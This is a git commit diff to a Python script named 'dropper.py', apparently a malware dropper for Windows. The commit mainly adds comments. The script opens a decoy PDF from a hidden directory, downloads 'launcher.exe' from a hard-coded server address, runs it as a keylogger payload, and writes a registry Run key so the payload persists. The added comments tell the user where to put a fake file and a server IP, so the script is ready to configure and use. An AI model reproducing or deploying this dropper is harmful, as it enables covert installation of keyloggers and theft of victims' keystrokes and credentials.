0de6ed690b9c85b821c45846faa36b368563f61e
Defopticon IT <defopticon@protonmail.com>
2022-06-24 01:56:00 +0200

    Update dropper.py

--- dropper.py
+++ dropper.py
@@ -10,18 +10,17 @@ def down_and_wr(url):
 	with open(file_name, "wb") as out_file:
 		out_file.write(get_response.content)
 
-
-first_file_location = ".Trash-1000\\Files\\Hacking.pdf"
-
+#LAUNCH FAKE FILE FROM DRIVE (HIDDEN DIRECTORY)
+first_file_location = ".Trash-1000\\Files\\Hacking.pdf" #PLACE HERE YOUR FAKE FILE
 subprocess.Popen(first_file_location, shell=True)
 
-
+#DOWNLOAD AND INSTALL PAYLOAD FROM LOCAL SERVER:
 keylogger_location = os.environ['USERPROFILE'] + "\\Desktop"
 os.chdir(keylogger_location)
-down_and_wr("http://192.168.1.106/launcher.exe")
+down_and_wr("http://192.168.1.106/launcher.exe") #EDIT THIS LINE WITH IP ADDRESS OF LOCALHOST SERVER 
 subprocess.Popen("launcher.exe", shell=True)
 
-
+#PERSISTENCY  
 subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v launcher /t REG_SZ /d "' + keylogger_location + "\\launcher.exe" + '"', shell=True)
 
 sys.exit()
